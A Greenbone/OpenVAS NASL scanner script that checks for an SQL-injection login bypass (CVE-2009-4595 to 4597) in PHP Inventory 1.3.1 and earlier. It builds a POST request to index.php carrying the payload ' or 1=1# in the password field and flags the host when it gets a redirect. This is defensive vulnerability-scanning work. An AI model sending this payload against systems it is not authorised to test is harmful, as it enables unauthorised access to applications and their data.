# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802534");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2011-12-05 15:37:27 +0530 (Mon, 05 Dec 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2009-4595", "CVE-2009-4596", "CVE-2009-4597");

  script_tag(name:"qod", value:"50"); # Vuln check below is quite unreliable

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("PHP Inventory < 1.3.2 SQLi Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"PHP Inventory is prone to an SQL injection (SQLi)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an input passed the to 'user' and 'pass'
  form field in 'index.php' is not properly sanitised before being used in an SQL query.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to include
  arbitrary HTML or web scripts in the scope of the browser and allows to obtain and manipulate
  sensitive information.");

  script_tag(name:"affected", value:"PHP Inventory version 1.3.1 and prior.");

  script_tag(name:"solution", value:"Update to version 1.3.2 or later.");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/Dec/0");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/520692");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/107425/INFOSERVE-ADV2011-08.txt");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );

if( ! http_can_host_php( port:port ) )
  exit( 0 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/", "/php-inventory", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  url = dir + "/index.php";

  res = http_get_cache( port:port, item:url );
  if( ! res || res !~ "^HTTP/1\.[01] 200" )
    continue;

  variables = "user=admin&pass=%27+or+1%3D1%23";

  req = string( "POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen( variables ),
                "\r\n\r\n", variables );

  res = http_keepalive_send_recv( port:port, data:req );

  if( egrep( pattern:"^HTTP/1\.[01] 302", string:res ) && "Location: index.php" >< res ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
